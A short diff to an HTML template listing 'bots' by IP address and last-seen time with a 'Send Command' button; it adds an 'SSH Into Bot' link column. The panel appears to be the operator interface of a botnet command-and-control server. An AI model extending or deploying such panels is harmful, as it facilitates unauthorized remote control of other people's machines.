@@ -79,6 +79,7 @@
                 <th>IP Address</th>
                 <th>Last Seen</th>
                 <th>Action</th>
+                <th>SSH Access</th> <!-- Added SSH Column -->
             </tr>
         </thead>
         <tbody>
@@ -89,6 +90,9 @@
                 <td>{{ bot[2] }}</td>
                 <td>
                     <button onclick="sendCommand('{{ bot[0] }}')">Send Command</button>
+                </td>
+                <td>
+                    <a href="ssh://{{ bot[1] }}" target="_blank">SSH Into Bot</a> <!-- Added SSH Access Link -->
                 </td>
             </tr>
             {% endfor %}
